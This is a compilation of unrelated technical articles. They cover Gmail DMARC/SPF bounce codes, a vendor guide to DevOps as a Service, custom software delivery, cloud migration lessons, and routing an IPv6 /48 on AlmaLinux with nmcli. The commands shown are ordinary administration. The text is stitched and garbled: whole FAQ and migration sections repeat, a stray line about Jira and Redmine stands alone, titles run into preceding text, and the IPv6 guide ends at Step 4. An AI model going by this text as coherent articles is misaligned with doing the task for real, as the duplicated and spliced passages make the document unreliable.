title: SMTP 550 5.7.26 / 5.7.23: Gmail DMARC & SPF fails
summary:
Gmail (and Microsoft with 5.7.509/5.7.515) rejects the message because it is not authenticated via SPF or DKIM in alignment with the From domain.

Common causes

  • The sending IP (newsletter tool, CRM, web shop) is missing from the SPF record.
  • SPF exceeds the 10 DNS lookup limit and returns permerror.
  • DKIM is not signing, or the DNS selector does not match the key.
  • No alignment: SPF/DKIM pass for a different domain than the one in From:.
  • Forwarding through third-party servers breaks SPF and there is no DKIM to fall back on.

How to check it

Query the sender domain's SPF record

dig +short TXT example.com | grep spf1

Query the DMARC policy

dig +short TXT _dmarc.example.com

Check the DKIM key for the selector

dig +short TXT default._domainkey.example.com

What actually helps

  1. Add every sending source via ip4:/include: to SPF and end it with ~all or -all.
  2. Keep SPF under 10 lookups: drop unused includes or replace them with IP ranges.
  3. Enable DKIM signing on the mail server or sending service and publish the public key at selector._domainkey.

FAQ

What is the difference between 5.7.26 and 5.7.23?

5.7.26 means DMARC failed or the mail is not authenticated at all. 5.7.23 means the SPF check itself hard-failed, typically with -all.

Is SPF alone enough for Gmail?

Not for bulk senders – Google requires SPF and DKIM plus DMARC. Even at low volume DKIM is the more robust base because it survives forwarding.

title: DevOps as a Service: What It Is, Costs, and When to Use It
summary:
This guide was written by Arthur Azrieli, CTO at MeteorOps, and first published on the MeteorOps blog.

Bottom line

DevOps as a Service (DaaS) means an outside team of DevOps engineers builds and runs your delivery and cloud operations for a recurring fee: CI/CD pipelines, infrastructure as code, Kubernetes or other runtimes, monitoring, security baselines and cost control. You get a team's skills for less than a team's payroll. In exchange, you have to manage the ownership, access and exit terms carefully.

It beats hiring when your DevOps workload is real but not big enough for two or three full-time specialists. It also fits when you need senior skills faster than you can recruit them, or when one engineer is currently the only person who understands production. It loses to hiring when infrastructure is your product, when the work is constant and deep enough to keep a team busy, or when nobody inside the company can own decisions about the platform.

This guide is for founders, CTOs and engineering leaders deciding how to cover DevOps. It covers what DaaS actually includes, the delivery models providers sell under that name, how pricing works and how to compare it with the true cost of hiring, a decision checklist, contract safeguards, and how to run the first 90 days.

What DevOps as a Service actually includes

"DevOps as a Service" gets used for three different things, which is why the search results feel contradictory:

  • A managed engineering service. A provider's engineers work on your cloud accounts, repositories and pipelines on an ongoing basis. This is what most buyers mean, and what this guide is about.

  • A hosted toolchain. GitHub, GitLab, Azure DevOps or AWS developer tools sold as SaaS. Useful, but that is buying tools, not getting DevOps done.

  • A platform product. An internal developer platform or "platform as a service" that hides infrastructure behind a portal. It reduces DevOps work for product teams, but someone still has to run it.

A serious DaaS engagement usually covers these workstreams. Most companies need four or five of them, not all eight:

Workstream What the provider does What you should get to keep
Cloud foundation Account structure, networking, identity and access, landing zone, environments Infrastructure as code in your repositories, an access model diagram
Infrastructure as code Terraform or OpenTofu modules, state management, review workflow Modules your engineers can read and change through pull requests
CI/CD Build, test and deploy pipelines, environment promotion, rollback Pipeline definitions in your repositories, a documented release process
Runtime Kubernetes, ECS, Cloud Run or VM operations, upgrades, autoscaling Upgrade runbooks, a version and support calendar
Observability Metrics, logs, traces, dashboards, alert rules Alerts that page the right owner, dashboards per service
Reliability and on-call Incident response, postmortems, backup and restore testing Runbooks, tested restore procedures, an escalation policy
Security and compliance Secrets management, least privilege, vulnerability scanning, audit evidence Evidence that maps to your SOC 2 or ISO 27001 controls
Cost control Tagging, rightsizing, commitments, budgets and alerts A cost report your finance team can read, owners per cost line

Look at the last column. It is the real test of a DaaS provider. The fee buys work, but the value you keep is the code, documentation and operating habits that stay when the engagement ends.

The four ways to get DevOps covered

DaaS is one of four models. The difference that matters most is who owns the outcome and who directs the work day to day.

In-house DevOps team DevOps as a Service Staff augmentation Project consulting
Who directs the work You Shared: you set priorities, the provider plans and executes You The provider, against a defined goal
Who owns production outcomes You Shared, defined in the contract You You, after handover
Typical commitment Permanent headcount Monthly, ongoing Monthly per engineer Fixed scope and timeline
Time to first useful work Months (hiring plus ramp-up) Days to weeks Weeks Weeks
Breadth of skills Whatever you hired A bench of specialists behind your main engineer One person's skills Whatever the project needs
Main risk Slow hiring, single points of failure Knowledge staying with the provider You still need to manage and review the work Handover to nobody
Best for Large, constant platform work Startups and scale-ups without a full DevOps team A known backlog and a capacity gap A migration or a one-off build


DevOps as a Service is the only model where direction and ownership are shared, and it starts in days to weeks.

Many companies combine them: DaaS to stabilize and build the foundation, then one internal hire who takes over day-to-day ownership while the provider stays on for depth and coverage. If the staff augmentation column looks closer to what you need, read how to choose a staff augmentation company. For a project with a clear end, read how to choose a DevOps consulting service.

When DevOps as a Service beats hiring

DaaS is usually the better choice when most of these are true:

  • The workload is real but uneven. Some months bring a migration, a compliance audit or a Kubernetes upgrade. Other months are mostly maintenance. A full-time hire is either overloaded or underused.

  • You need breadth one person cannot have. Networking, Kubernetes internals, Terraform design, database operations, security and cost optimization rarely sit in one head.

  • Production depends on one person. If your only infrastructure engineer goes on holiday and deploys stop, you have a bus factor of one. A provider gives you coverage and a second pair of eyes.

  • Hiring is slow or risky. Senior DevOps engineers are hard to assess if nobody on your team is senior in DevOps. A bad hire with production access is expensive to undo.

  • You are early. Teams of roughly 5 to 40 engineers usually do not need a dedicated platform team yet, but they do need production-grade foundations.

When hiring wins

  • Infrastructure is part of what you sell (a data platform, a developer tool, a hosting product).

  • The work is constant and deep enough to keep two or more specialists busy all year.

  • Regulation or customer contracts prevent outside parties from accessing production.

  • You are building a platform team that will serve many product teams, and you want it to grow with the company.

Even then, a provider often helps for the first months: setting up the foundations, helping you interview candidates and handing over to the new team. If you are unsure how much DevOps work you actually have, estimate your required DevOps capacity before deciding. The guide to building a DevOps team covers the hiring path.

How much DevOps as a Service costs

Providers rarely publish prices, and the ones that do are not comparable, because "a plan" can mean ten hours or a full-time engineer. What you can compare is the pricing model and what it includes.

Pricing model How it works Good for Watch for
Monthly hours plan A fixed block of engineering hours per month, often with tiers Ongoing work with uneven demand Unused-hour expiry, response times outside the plan
Dedicated engineer One or more named engineers at a monthly rate Steady workload, deep context Whether a senior backs up the engineer, cover during leave
Managed service with service levels A fee per environment or service, with uptime and response commitments Operations you never want to think about What counts as "in scope", penalties that are only credits
Fixed-price project plus retainer A defined build, then a smaller monthly plan to run it Foundations, migrations Change requests, who fixes defects after go-live
Pay per hour Billed monthly for hours worked Advisory work, small or unpredictable needs Availability when you need someone urgently

Compare it with the real cost of hiring

The fair comparison is not a provider's monthly fee against a salary. It is against the full cost of covering the same work in-house:

  • Loaded salary. The US Bureau of Labor Statistics puts the median software developer wage at $135,980 (May 2025). Experienced DevOps and platform engineers are often above that median. Wages are about 70% of total employer compensation cost in US private industry (BLS, June 2026), so a $136,000 salary is roughly $194,000 in total cost before recruiting, equipment and tooling.

  • Recruiting and ramp-up. Recruiter fees, interview time from your senior engineers, and the months before a new hire is fully productive.

  • Coverage. One engineer is not on-call coverage. Real coverage for production needs at least two people who can respond, or an escalation path to someone outside.

  • Breadth gaps. The specialist work your hire cannot do still needs a consultant, so add a buffer for it.

  • Cost of mistakes. Outages, security incidents and cloud waste from missing experience are real costs, even if they never appear in a budget line.


Compare a provider's quote with the full stack of hiring costs, not with the salary alone.

Put a one-year number on each line, then ask providers to quote the same scope. If the provider costs more but removes the coverage gap and the breadth gap, it can still be the cheaper option. If you have constant work for two engineers, hiring usually wins on cost within a year or two. To see how MeteorOps structures engagements, see the plans and pricing page.

Decision checklist: DaaS, hire, or both

Answer these honestly. Each "yes" in the left group points toward DevOps as a Service, and each "yes" in the right group points toward hiring.

Points to DevOps as a Service Points to hiring
Fewer than about 40 engineers, no platform team yet Several product teams that need a shared platform
Workload swings with launches, audits and migrations Constant workload for two or more specialists
Only one person understands production today You already have DevOps people who need reinforcement
You need results this quarter You can wait three to six months for a hire to ramp up
You need several specialties occasionally You need one specialty all the time
Nobody internal can assess DevOps candidates A senior engineer can run the hiring process

A mixed result is common and usually means "both": a provider now, and a plan to hire one owner who works alongside them.


Count the yes answers on each side; a mixed result usually means using both.

What good DevOps as a Service looks like in practice

These are the signals that a provider runs DaaS as engineering, not as a ticket desk:

  • Everything lands in your repositories. Terraform, pipeline files, Helm charts and runbooks live in your Git organization and go through your pull request reviews.

  • Access is personal and least privilege. Each engineer has their own identity through your identity provider or AWS IAM Identity Center. Nobody shares root credentials or long-lived access keys.

  • A named lead engineer, with seniors behind them. You know who works on your systems, and design reviews involve someone more senior than the person doing the work.

  • Visible work. A shared backlog, short written updates, and decisions recorded where your team can find them.

  • Measured outcomes. Progress is tracked with delivery metrics such as the five DORA metrics (change lead time, deployment frequency, failed deployment recovery time, change fail rate and deployment rework rate), plus cloud cost and incident trends. Hours logged and tickets closed do not count as outcomes.

  • Your team gets more capable. Your developers can deploy, read dashboards and handle common incidents without asking the provider.

Contract safeguards before you sign

DaaS contracts fail at the edges: who owns what, how fast someone responds, and how you leave. Check these clauses:

Clause What to look for
Intellectual property All code, configuration and documentation created for you belongs to you, with no license fees to keep using it
Access and credentials Your identity provider, individual accounts, removal on exit, no provider-owned accounts in your production path
Scope and response times What is included, what is extra, and response times for production incidents in writing
Named people Who your lead engineer is, notice before they change, and how a replacement gets onboarded
Security and confidentiality Handling of secrets and customer data, background checks, and support for your audits
Exit and handover A handover period, final documentation, access removal and a reasonable notice period
Commitment Minimum term, how to scale hours up or down, and what happens to unused hours

A provider that resists the exit clause is telling you how the relationship will end. A good one plans for its own replacement from the first week.

The first 90 days of a DevOps as a Service engagement

  1. Days 1 to 14: access and assessment. Set up individual access, review cloud accounts, repositories, pipelines, monitoring, incident history and the cloud bill. The output should be a written list of risks ranked by impact, not a new architecture.

  2. Days 15 to 45: reduce the biggest risks. Typical first fixes: backups that are actually restorable, removing shared admin access, moving unmanaged production resources into infrastructure as code, alerts on customer-facing symptoms, and a rollback path for deployments.

  3. Days 46 to 75: speed up delivery. Faster, more reliable pipelines, preview or staging environments that match production, and fewer manual release steps.

  4. Days 76 to 90: review and plan. Compare the delivery metrics, incident count and cloud spend against day 1. Agree on the next quarter's priorities and adjust the plan size up or down.


A good engagement starts with a ranked risk list and earns the right to speed things up.

If the first two weeks produce a sales proposal for a large rebuild instead of a ranked risk list, slow down. A DevOps maturity assessment is a cheap way to get a baseline before you commit to anything larger.

Common mistakes with DevOps as a Service

  • Outsourcing ownership along with the work. Someone inside the company still has to make product and risk decisions about production.

  • Treating the provider as a ticket queue. If every change waits for a ticket to be picked up, delivery slows down. Ask for self-service paths for your developers.

  • Letting infrastructure live in the provider's accounts. Cloud accounts, domains, repositories and secrets stores should be yours from the start.

  • Buying tools before defining problems. New platforms do not fix unclear ownership or missing runbooks.

  • No exit plan. If you could not switch providers in a month, you are locked in, whatever the contract says.

FAQ

What is DevOps as a Service?

DevOps as a Service is an outsourced model where an external team builds and operates your delivery pipelines, cloud infrastructure, monitoring and related practices for an ongoing fee. Unlike buying DevOps tools, you are buying engineers' time and expertise, delivered inside your own accounts and repositories.

Is DevOps as a Service the same as managed DevOps services?

Mostly, yes. "Managed DevOps services" usually puts more emphasis on running existing systems against service levels, while "DevOps as a Service" also covers building new foundations. In practice, check the scope and response terms rather than the label.

How much does DevOps as a Service cost?

It depends on the pricing model (hours plan, dedicated engineer, managed service or project) and the scope. Compare quotes against the full one-year cost of hiring: loaded salary, recruiting, ramp-up, on-call coverage and the specialist help a single hire would still need.

Is DevOps as a Service worth it for a small team?

For teams without a dedicated DevOps engineer, it usually is, because one hire cannot cover all the specialties or provide on-call coverage alone. It is less attractive if your workload is small enough for a few hours of advice a month, or large and constant enough for two full-time hires.

Can a DevOps as a Service provider work alongside our in-house engineers?

Yes, and that is often the best setup. The provider brings depth and coverage, while your engineers keep product context and ownership. Make sure work goes through the same repositories, reviews and backlog.

What are the risks of DevOps as a Service?

The main risks are knowledge staying with the provider, broad access to production, and lock-in through provider-owned accounts or tools. Clear IP ownership, individual least-privilege access, documentation in your repositories and a written exit plan reduce all three.

How fast can a DevOps as a Service team start?

A good provider can start within days of signing, once access is granted. Expect a short assessment first. Visible improvements usually come within the first month, and bigger changes such as migrations take longer.

The short version

DevOps as a Service gives a startup senior DevOps coverage without building a team: foundations, pipelines, monitoring, security and cost control, delivered in your own accounts. Choose it when the work is real but uneven, when you need breadth and coverage, or when production depends on one person. Hire when infrastructure is your product or the work is constant. Either way, keep ownership, access and the exit plan on your side.

FAQ

The main risks are knowledge staying with the provider, broad access to production, and lock-in through provider-owned accounts or tools. Clear IP ownership, individual least-privilege access, documentation in your repositories and a written exit plan reduce all three.

How fast can a DevOps as a Service team start?

A good provider can start within days of signing, once access is granted. Expect a short assessment first. Visible improvements usually come within the first month, and bigger changes such as migrations take longer.

The short version

DevOps as a Service gives a startup senior DevOps coverage without building a team: foundations, pipelines, monitoring, security and cost control, delivered in your own accounts. Choose it when the work is real but uneven, when you need breadth and coverage, or when production depends on one person. Hire when infrastructure is your product or the work is constant. title: Custom Software Development in 2026: Process, Timelines and What Actually Drives Cost
summary:
Every growing company hits the same wall. The SaaS tools that worked at ten people start fighting you at fifty. Staff keep shadow spreadsheets because the CRM cannot model your actual workflow, integrations are held together by manual exports, and every "simple change" becomes a vendor ticket that takes three weeks. That is usually the moment custom software development stops being a luxury and becomes the cheaper option. This guide walks through how the process actually works in 2026: the phases, the timelines, what drives the cost, and how modern delivery teams use AI in the loop.

Build vs buy: the honest test

Custom software is not always the answer. If a mature SaaS product fits your process, it will almost always be faster and cheaper. The build decision makes sense when at least one of these is true:

  • Your workflow is your competitive advantage, and off-the-shelf tools force you to work like everyone else.
  • You are paying for five tools and a team of people copying data between them.
  • Compliance requirements (SOC 2, HIPAA, GDPR, PCI DSS) do not fit a vendor's defaults.
  • Your transaction volume makes per-seat SaaS pricing more expensive than owning the system.

If none of those apply, buy. If two or more apply, keep reading.

The five phases of a custom build

1. Discovery and planning (1–2 weeks). Stakeholder interviews, a requirements workshop and an architecture review. The output is not a quote based on a guess: it is a roadmap, a sprint plan and a scoped backlog. Skipping this phase is the single most common cause of failed projects.

2. Design and architecture (weeks 2–4). UX/UI flows and prototypes, API contracts, data models and infrastructure design. Decisions made here — monolith vs microservices, which database, how integrations authenticate — are the ones that are expensive to reverse later.

3. Build in two-week sprints. Backend and APIs (Node.js, Python, .NET, Java, Go), frontend (React, Angular, Vue, TypeScript), integrations with ERPs, CRMs, payment processors and legacy systems. The key discipline: working software every two weeks, demoed at the end of every sprint — not one big reveal at month six.

4. QA and code review. Automated unit, integration and end-to-end tests on every commit. This is where 2026 delivery differs most from 2016: AI agents now review every pull request, flag risky patterns and detect blockers before they become critical. AI amplifies engineers here — it does not replace them — but it removes hours of repetitive checking from every sprint.

5. Launch and the long tail. Zero-downtime releases with blue-green or canary deployments, then the unglamorous work that decides whether the system survives: security patching, dependency updates, performance tuning and technical-debt reduction tracked as a delivery metric.

Timelines: what to actually expect

  • Discovery: 1–2 weeks
  • MVP: 3–6 months
  • Mid-sized application: 6–12 months

Anyone promising a serious platform in six weeks is selling you a prototype. The factors that stretch timelines are predictable: the number of workflows and user roles, each integration with a legacy system or proprietary database, compliance scope, the state of existing code (refactoring someone else's system takes longer than a clean build), and — the silent killer — how fast your own team approves acceptance criteria.

What one sprint actually looks like

Abstract process diagrams hide the part that matters: the rhythm. In a healthy two-week sprint, the week starts with a planning session where the next slice of the backlog is broken into tasks with estimates and acceptance criteria. Engineers pick up work from a shared board — the same board you can open at any time — and every commit triggers the CI pipeline: build, unit tests, integration tests, and an AI review pass that comments on the pull request before a human reviewer sees it.

Mid-sprint, blockers surface early because the board shows them: an API that is not ready, a decision waiting on your side, a third-party sandbox that is down. Good delivery teams track this openly with simple metrics — lead time, deployment frequency, change failure rate (the classic DORA set) — so "how is the project going?" has a factual answer instead of a vibe.

At the end of the sprint there is a demo of working software in a staging environment that behaves like production. You click through the actual feature, give feedback, and reprioritise the backlog if the business has changed. That loop — plan, build, demo, reprioritise — repeated twelve times is what turns a vague idea into a launched MVP without a single "big bang" moment where everything is revealed at once and half of it is wrong.

The three delivery models

In-house team. Maximum control, maximum fixed cost. One hire covers one role; a real product needs discovery, architecture, backend, frontend, QA and release skills. Hiring that bench takes months and you carry it between projects.

Traditional agency. Project-priced, milestone-billed. Works well for a fixed, well-understood scope; struggles when priorities change mid-build, because every change is a contract conversation.

Managed delivery plan. The newer model: one monthly price for the whole team — delivery owner, engineers, QA, DevOps — working through your backlog one priority at a time, with progress visible on a live delivery board. This is how custom software development is increasingly bought by companies that need continuous delivery without building a department: you queue scopes (a customer portal, a CRM build, an integration hub) and the team ships them in order, typically starting within days rather than months.

Whichever model you choose, insist on three things: you own the code and IP from day one, releases land in your repositories and your cloud accounts, and you can see sprint progress without asking for a status meeting.

The bottom line

Custom software pays off when it is built around your workflows, delivered in visible two-week increments, and owned outright by you. Start with discovery, be honest about build vs buy, and pick a delivery model that keeps shipping after the launch party. The companies that get this right end up with a strategic asset their competitors cannot buy off the shelf — which is the entire point.

title: What to Keep in Mind for a Cloud Migration
summary:
I have led a couple of platform migrations, from on-premises to AWS and from one AWS account structure to another. Each time my job was to coordinate the application, database, DevOps and network teams from scoping to cutover.

This is the list I would want you to keep in mind before you start one. It is grouped into seven categories. Under each I say what to think about and, where it helps, what we did.

1. Scope: decide what changes and what waits

A migration is a chance to modernize, and it is also the easiest place to over-engineer. Start from the rules of the target environment. Ours were no static credentials, TLS on database connections, nothing public by default, autoscaling, and tags on every resource so cost splits by application.

Then list every improvement someone wants and make a call on each one.

Area Think about What we did
Database Move to a managed engine? Upgrade the major version in the same move? Moved to Aurora with an engine upgrade and TLS
Runtime Can VMs, ECS and EKS collapse into one? Consolidated on EKS
Secrets Use a secrets manager and take passwords out of code and config files Secrets moved into AWS
Configuration Externalize parameters so the same build deploys to every environment Config maps
Logging Send application logs to a central store instead of local disk Central search cluster
Access Use roles between services and drop long-lived keys Role-based access
Pipeline Can one pipeline deploy everything? Is GitOps in reach? One CI server in a shared account. GitOps came later, once the runtime was standard
Search and loaders Upgrade or rewrite now, or carry them over as they are? Deferred. Both needed application code changes
Backups Does going live need a new backup design? Deferred. Snapshots were enough

Two columns in the task tracker kept this honest: "key project goal" and "blocker for the first environment". A task with a no in both waited.

2. Discovery: get the complete picture

Get a complete application architecture diagram before anyone builds. Expect the first version to be partial, and keep asking. A platform that has run for years has connections nobody wrote down.

Build an inventory for every environment:

  • Which component runs where, and why it runs there.
  • Every DNS name, with its zone, load balancer, protocol, target group and the resource behind it.
  • Every inbound caller and every outbound dependency.
  • Every loader, job and script that reads or writes the data.

Check your assumptions two and three times, including the convenient ones. We worried that bucket names were stored in the database, which would have made renaming buckets painful. We checked, and they were in a properties file. We also assumed a transit gateway would cover traffic between accounts, and we needed VPC peering as well.

Compare the environments against each other. Production and non-production are rarely built the same way, and the differences are where the cutover steps change.

Even with all of this, three things found us late: another product's web client that read our object storage directly, a data warehouse job that read a logging table we planned to retire, and a monitoring script that counted documents in the old search cluster. Leave room in the plan for your own version of these.

3. People and calendar: one scrum, one plan

Each team has its own backlog, its own way of working and other projects competing for the same people. Someone has to keep those plans moving as one.

  • Run one scrum across all teams. Ours started weekly, went to twice a week to clear blockers, and became daily near the first cutover.
  • Ask every team the same three questions. What are you working on, and what is the estimate? What is blocked or likely to slip, and what is the alternative? What still has to happen for the next environment to cut over on its date?
  • Keep one board. One epic, with each team's own tickets linked in.
  • Spell out requirements early. When one team settles on a solution, share what it needs from the others the same day.
  • Post outcomes in the shared channel. Two-person working sessions are fine, but the result belongs where every team sees it.
  • Follow up instead of waiting. It never hurts to over-communicate.
  • Plan around the calendar. Change freezes, public holidays and time off for key people all punch holes in a quarter. Keep a tab for who is out and when, and set each environment window around it.

Dates will still move, and ours did on the first environment. Build slack around the known gaps so one slip does not push every later window.

4. Data: the part that decides the cutover

Compute can be redeployed. Data has to be moved, kept in sync and proven correct, so it shapes the whole cutover. There is no single right method, only questions you have to answer.

Can you take downtime? Decide this first, with the product owner. A short window removes a whole class of design. We could take one.

One direction or two? Bidirectional replication buys an easy rollback and costs you conflict handling and weeks of testing. We tested replicating back from the upgraded engine to the old one and hit problems. We chose one direction: seed the new database from a shared snapshot, replicate old to new with native replication, and roll back by export and import. That rollback carries downtime, so tell the product team before they agree.

Native or heterogeneous tooling? Every engine has its own replication. Tools such as AWS DMS or Oracle GoldenGate cover moves across engines. Pick the option with the fewest steps to script and test. For us that was native.

Where else does the data live? Rarely in one place. Ours was in three, each with its own method:

Store How it moved Rollback
Relational database Snapshot seed, then one-way native replication Export and import
Search cluster Snapshot to a shared bucket and restore, then a remote reindex of the current day during the window Reindex back
Object storage Bidirectional bucket replication, left on for days after cutover Files already in both accounts

What feeds it and what reads it? List every inbound loader and every downstream reader. We stopped the loaders before the window and repointed them after. The downstream warehouse stayed on the old database for one more day.

What can testing break? Readiness tests that write to the new database while replication is running can break the replication. Plan which tests write, and when.

5. Network and edges: where it usually breaks

The application and the database get the attention. The surprises come from DNS, load balancers and allowlists.

DNS. If the domain's hosting moves too, stage it so a rollback never touches the registrar. We moved ours into Route 53 like this:

  1. Create the new hosted zone as an empty shell. Not live, and no records created early.
  2. Add temporary names in the old zone that point at the new load balancers, so the new stack can be tested before cutover.
  3. At cutover, repoint the old zone's records to the new load balancers.
  4. The next day, sync the records into the new zone.
  5. After 24 hours, publish the new name servers at the registrar next to the old ones.
  6. After another 24 hours, remove the old name servers and watch the URL monitors.

Load balancers. Decide where TLS terminates, what the listener rules are, and whether each endpoint gets its own load balancer or shares one with host and path routing. Have services call each other through a load balancer or a DNS name, not through the cluster's internal networking.

Allowlists. A new account means new outbound addresses. Every partner and internal service that allowlisted the old ones needs the new ones before cutover. Give every outbound call (email delivery, analytics, partner APIs) its own line in the inventory. Check inbound routes too, such as loaders that still run on-premises.

Object storage. If browser or mobile clients read buckets directly, the CORS rules move with the buckets. If bucket names change, find every place a name is stored.

Edge protection. Check what sits in front of production that the lower environments lack. One of our APIs was behind a web application firewall only in production, and a deployment that rewrote its DNS record would have broken it.

6. Cutover: rehearse it the same way every time

Cut over the lowest environment exactly the way you will cut over production. People will ask why QA needs this much ceremony. QA is the only rehearsal production gets.

  • Use one runbook format for every environment. Ours had a preparation tab, a cutover tab, a rollback tab and a DNS tab. Every row had a date, time, duration, team, owner and status.
  • Write the application test cases before the first environment. Run the same set in every environment.
  • Get a sign-off from each team. Once before the window and again after it.
  • Script every cutover and rollback command. Store the scripts before the night.
  • Say ahead of time what a lower environment cannot prove. A production-only firewall, a registrar change and a disaster-recovery copy are typical.
  • Give cleanup its own change request. We had two people present for every bucket deletion.

Our rehearsals showed that deployments had to finish before the window, that published DNS had to be checked against expected results, and that the cutover needed an application redeploy. Each of those would have been a surprise in production.

For a sense of scale, our production runbook budgeted about forty minutes from cutting traffic to sign-off.

7. Monitoring, retention and cost: decide early

Monitoring. Set up monitoring and central logging in the new environment before the cutover. Put full coverage of databases and application URLs on the production readiness list. Stay on one approved logging path. If the cluster auto-instruments applications, a new service comes up already covered.

Retention. Autoscaling without retention is a bill that grows quietly. Set retention at every layer as it is built: log indices, database logging tables, buckets and container images. We left some of these until after cutover, and I would not do that again.

Cost. The cost lessons are mostly about deciding early:

  • Pick instance classes before the build, so reserved capacity can be planned.
  • Run the consolidated cluster on reserved instances.
  • Create temporary instances with volumes that delete on termination.
  • Question any design that copies data between accounts more than it needs to.
  • Ask whether every log line is needed before paying to ship and store it.

My take

A migration is mostly coverage. Know what you have, decide what changes now and what waits, move the data with a rollback you have tested, and rehearse the cutover in every environment. In my experience the hard moments come from things nobody wrote down far more often than from the technology.

It is also never one person's work. Application, database, DevOps and network engineers build it. The lead's job is to keep the scope honest, the plan visible and the teams talking to each other.

With a clear scope, a complete architecture diagram, a regular scrum and a firm timeline, and with AI tools to speed up the inventory and runbook work, three to five months is a fair plan for most platform migrations.

Edge protection. Check what sits in front of production that the lower environments lack. One of our APIs was behind a web application firewall only in production, and a deployment that rewrote its DNS record would have broken it.

6. Cutover: rehearse it the same way every time

Cut over the lowest environment exactly the way you will cut over production. People will ask why QA needs this much ceremony. QA is the only rehearsal production gets.

  • Use one runbook format for every environment. Ours had a preparation tab, a cutover tab, a rollback tab and a DNS tab. Every row had a date, time, duration, team, owner and status.
  • Write the application test cases before the first environment. Run the same set in every environment.
  • Get a sign-off from each team. Once before the window and again after it.
  • Script every cutover and rollback command. Store the scripts before the night.
  • Say ahead of time what a lower environment cannot prove. A production-only firewall, a registrar change and a disaster-recovery copy are typical.
  • Give cleanup its own change request. We had two people present for every bucket deletion.

Our rehearsals showed that deployments had to finish before the window, that published DNS had to be checked against expected results, and that the cutover needed an application redeploy. Each of those would have been a surprise in production.

For a sense of scale, our production runbook budgeted about forty minutes from cutting traffic to sign-off.

7. Monitoring, retention and cost: decide early

Monitoring. Set up monitoring and central logging in the new environment before the cutover. Put full coverage of databases and application URLs on the production readiness list. Stay on one approved logging path. If the cluster auto-instruments applications, a new service comes up already covered.

Retention. Autoscaling without retention is a bill that grows quietly. Set retention at every layer as it is built: log indices, database logging tables, buckets and container images. We left some of these until after cutover, and I would not do that again.

Cost. The cost lessons are mostly about deciding early:

  • Pick instance classes before the build, so reserved capacity can be planned.
  • Run the consolidated cluster on reserved instances.
  • Create temporary instances with volumes that delete on termination.
  • Question any design that copies data between accounts more than it needs to.
  • Ask whether every log line is needed before paying to ship and store it.

My take

A migration is mostly coverage. Know what you have, decide what changes now and what waits, move the data with a rollback you have tested, and rehearse the cutover in every environment. In my experience the hard moments come from things nobody wrote down far more often than from the technology.

It is also never one person's work. Application, database, DevOps and network engineers build it. The lead's job is to keep the scope honest, the plan visible and the teams talking to each other.

With a clear scope, a complete architecture diagram, a regular scrum and a firm timeline, and with AI tools to speed up the inventory and runbook work, three to five months is a fair plan for most platform migrations.

Jira may suit teams centered on issue workflows; Redmine may suit those prioritizing self-managed issue tracking. title: How to Route and Configure a /48 IPv6 Subnet in AlmaLinux 8 & 9
summary:
An IPv6 /48 allocation provides a large address space that can be divided into 65,536 individual /64 subnets (providing over 1.2 septillion addresses). These subnets can support dedicated public addressing for virtual machines, containers, proxy infrastructure, and other network services.

Native IPv6 routing can provide publicly routable addresses to virtual machines and containers without requiring traditional IPv4-style NAT, provided the upstream network routes the allocated prefix correctly.

This guide details the architecture and commands required to safely configure a /48 subnet in AlmaLinux 8 and 9 using NetworkManager (nmcli), handle source address selection, and natively route IPv6 to Docker containers.

(Note: We use the RFC 3849 documentation prefix 2001:db8:abcd::/48 in all examples. Replace this with your actual allocated /48 prefix).

Prerequisites and Provider Routing Requirements

Before modifying server networking, ensure you have:

  • Out-of-Band (OOB) Console Access: (e.g., IPMI, iLO, KVM, or your provider's rescue console). Reapplying network configurations can temporarily drop SSH connections.
  • Confirmation of Upstream Routing: You must know how your provider routes the /48 to your server. Configuring the host depends entirely on whether the provider routes the /48 directly to your server's primary IPv6 address, or if it expects you to respond to Neighbor Discovery on an on-link /64.

Step 1: Identify Your Active Network Interface and Connection Profile

In AlmaLinux 8 and 9, NetworkManager controls networking. You need both the physical interface name and its NetworkManager connection profile name—they are not always identical.

First, find the physical interface name:

ip -br a

Example output shows ens3 as the active interface.

Next, find the associated Connection Profile:

nmcli connection show --active

Example Output:

NAME                UUID                                  TYPE      DEVICE
System ens3         5fb06bd0-0bb0-7ffb-45f1-d6edd65f3e03  ethernet  ens3

In this example, the connection profile name is "System ens3". You must use this specific profile name when issuing nmcli commands.

Check the Existing NetworkManager IPv6 Configuration:

Before assigning additional IPv6 addresses, check the current IPv6 configuration of your NetworkManager connection:

nmcli -f ipv6.method,ipv6.addresses,ipv6.gateway connection show "System ens3"

The ipv6.method setting determines how NetworkManager handles IPv6 configuration. Common values include auto, manual, disabled, and ignore. Check the existing method before adding static addresses. Do not change it blindly, as doing so may affect your provider's existing IPv6 gateway or Router Advertisement configuration.

Step 2: Understand Routed /48 vs On-Link /64 Configurations

Do not blindly assign a /64 prefix to your main network interface.

  • Routed /48 (Recommended): The provider routes the entire /48 to your server's primary IPv6 address. In this setup, assigning a full /64 to your physical interface creates an unwanted connected route, causing Linux to send Neighbor Solicitations for addresses that should be internally routed. Instead, assign individual host IP addresses as /128. Note that assigning a /128 to the host does not automatically route the rest of the /48; the provider-routed prefix and your local container/VM routes must work together.
  • On-Link /64: The provider connects a /64 directly to your VLAN. In this scenario, assigning a /64 to the interface is appropriate.

Check your provider's documentation before proceeding.

Step 3: Assign Secondary IPv6 Addresses Using NetworkManager

To bind specific IPs from your allocation (e.g., 2001:db8:abcd:1::10) to the host system, append them to the active connection profile. Assuming a routed setup, we bind these as /128.

(Remember to replace "System ens3" with your actual profile name).

nmcli connection modify "System ens3" +ipv6.addresses "2001:db8:abcd:1::10/128"
nmcli connection modify "System ens3" +ipv6.addresses "2001:db8:abcd:1::11/128"

Apply the changes (ensure you have OOB access in case of a typo):

nmcli connection up "System ens3"

Step 4: Configure IPv6 Source Address Selection

When multiple IPv6 addresses are bound to an interface, Linux source address selection follows RFC 6724 rules (including scope, destination matching, and address preference).

Depending on these rules, Linux might select one of your secondary IPs for outbound traffic. If an application reaches out to an external API, and your primary IP relies on specific firewall whitelists or a strict Reverse DNS (PTR) record for mail, this can cause outbound failures.

You can explicitly mark secondary addresses as deprecated. Deprecated addresses remain fully reachable for inbound connections, but RFC 6724 prefers non-deprecated addresses for automatic outbound source selection:

ip -6 addr change 2001:db8:abcd:1::10/128 dev ens3 preferred_lft 0
ip -6 addr change 2001:db8:abcd:1::11/128 dev ens3 preferred_lft 0

Note: To make this persistent across reboots in NetworkManager, configure manual IP lifetimes or use a dispatcher script in /etc/NetworkManager/dispatcher.d/.

Deprecation only influences automatic source selection. Applications can still explicitly bind to any available address. For example:

curl --interface 2001:db8:abcd:1::10 https://api64.ipify.org

